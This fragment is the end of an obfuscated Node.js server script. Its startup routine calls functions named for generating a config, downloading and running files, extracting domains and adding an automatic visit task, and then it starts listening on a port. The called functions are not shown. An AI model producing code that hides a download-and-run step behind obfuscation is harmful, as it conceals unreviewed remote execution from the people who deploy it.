console[_0x54d69c(0x1d1)]('automatic\x20access\x20task\x20added\x20successfully'),_0x452fdc;}catch(_0x18e286){return console[_0x54d69c(0x183)](_0x54d69c(0x1e3)+_0x18e286[_0x54d69c(0x1ef)]),null;}}async function startserver(){const _0x5ef36a=_0x838c24;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x17b185){console['error'](_0x5ef36a(0x18e),_0x17b185);}}startserver()[_0x838c24(0x17c)](_0x29d1f8=>{const _0x4d147a=_0x838c24;console['error'](_0x4d147a(0x1e8),_0x29d1f8);}),app[_0x838c24(0x1fa)](PORT,()=>console['log'](_0x838c24(0x16b)+PORT+'!'));
